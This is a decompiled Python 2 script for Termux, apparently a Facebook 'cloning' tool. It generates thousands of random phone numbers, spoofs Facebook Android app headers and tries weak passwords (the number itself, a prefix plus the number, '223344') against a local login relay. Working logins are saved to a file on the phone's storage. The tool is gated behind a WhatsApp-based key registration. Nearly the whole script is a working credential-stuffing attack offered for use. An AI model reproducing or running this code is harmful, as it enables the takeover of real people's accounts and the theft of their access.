# Source Generated with Decompyle++
# File: temp.pyc (Python 2.7)


try:
    import os
    import sys
    import time
    import datetime
    import random
    import hashlib
    import re
    import threading
    import json
    import getpass
    import urllib
    import cookielib
    import requests
    import uuid
    import string
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 cati.py')


try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
os.system('git pull')
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

from requests.exceptions import ConnectionError
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
reload(sys)
sys.setdefaultencoding('utf8')
logo = '\n        \x1b[1;97m    __  __           _    _ \n           |  \\/  |         | |  (_)\n           | \\  / |_   _ ___| | ___ \n           | |\\/| | | | / __| |/ / |\n           | |  | | |_| \\__ \\   <| |\n           |_|  |_|\\__,_|___/_|\\_\\_|                      \n \x1b[1;90m---------------------------------------------\n\x1b[1;97m [+] AUTHER     :   MUSKI \n [+] FACEBOOK   :   XTYLISH PATHANI \n [+] WHATSAPP   :   +1541xxxxxxx\n [+]\x1b[1;97m BE ORIGINAL LETS THE WORLD COPY YOU\n \x1b[1;97m---------------------------------------------'

def reg():
    os.system("clear")
    print(logo)
    print("")
    print("\033[1;32mTool activation")
    print("")
    time.sleep(1)
    try:
        to = open("/sdcard/.cat109.txt", "r").read()
    except (KeyError , IOError):
        reg2()
    r = requests.get("https://raw.githubusercontent.com/shanimashwani/shani/server.txt").text
    if to in r:
        os.system('clear')
        print(logo)
        print("")
        print("\033[1;32mGenerating connection")
        print("")
        os.system("cd ..... && npm install")
        os.system("fuser -k 5000/tcp &")
        os.system("#")
        os.system("cd ..... && node index.js &")
        os.system("xdg-open https://wa.me/+923451494589")
        time.sleep(5)
        method()
    else:
        os.system("clear")
        print(logo)
        print("")
        print("\033[1;31mRegistration Failed")
        print("")
        print(" \033[1;30mYour key is not registered yet ")
        print("")
        print(" Copy and send key to admin")
        print("")
        print(" \033[1;30mToken id: \033[1;32mCat-"+to)
        print("")
        raw_input(" \033[1;30mPress enter to send key")
        os.system("xdg-open https://wa.me/+923451494589")
        reg()
def reg2():
    os.system("clear")
    print(logo)
    print("")
    print("\033[1;31mYour device is not registered")
    print("")
    print(" \033[1;30mCopy and press enter , then select whatsapp to continue")
    print("")
    id = uuid.uuid4().hex[:75]
    s = open('/sdcard/.cat109.txt', 'w')
    s.write(id)
    s.close()
    ids = open('/sdcard/.cat109.txt', 'r').read()
    print(" Token id: "+ids)
    print("")
    print("")
    raw_input(" \033[1;30mPress enter to go to whatsapp ")
    os.system("xdg-open https://wa.me/+923451494589")
    raw_input(" Press enter to check registration ")
    reg()


def method():
    os.system('clear')
    print logo
    print ''
    print '\tSelect cloninig '
    print ''
    print '[1] Login cloning'
    print '[2] Without login cloning'
    print ''
    ms()


def ms():
    s = raw_input(' Choose option: ')
    if s == '1':
        login()
    elif s == '2':
        wlogin()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        ms()


def wlogin():
    id = []
    oks = []
    cps = []
    os.system('clear')
    print logo
    print ''
    print 'Example : 302 , 303 '
    print ''
    c = raw_input(' Code: ')
    
    try:
        list = '.txt'
        for li in open(list, 'r').readlines():
            id.append(li.strip())
    except (KeyError, IOError):
        print ''
        print '\t Numbers file not found'
        print ''
        os.system('exit')
    os.system('clear')
    print logo
    print ' Total numbers: ' + str(len(id))
    print ' The process has been started'
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        
        try:
            pass1 = user
            data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[CAT-OK] \x1b[1;32m' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/successful.txt', 'a')
                ok.write(c + user + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;31m[CAT-CP] ' + c + user + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(c + user + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(c + user + pass1)
            else:
                pass2 = c + user
                data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[CAT-OK] \x1b[1;32m' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/successful.txt', 'a')
                    ok.write(c + user + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;31m[CAT-CP] ' + c + user + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(c + user + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(c + user + pass2)
                else:
                    pass3 = '223344'
                    data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[CAT-OK] \x1b[1;32m' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/successful.txt', 'a')
                        ok.write(c + user + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;31m[CAT-CP] ' + c + user + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(c + user + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(c + user + pass3)
                    
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    wlogin()

if __name__ == '__main__':
    reg()
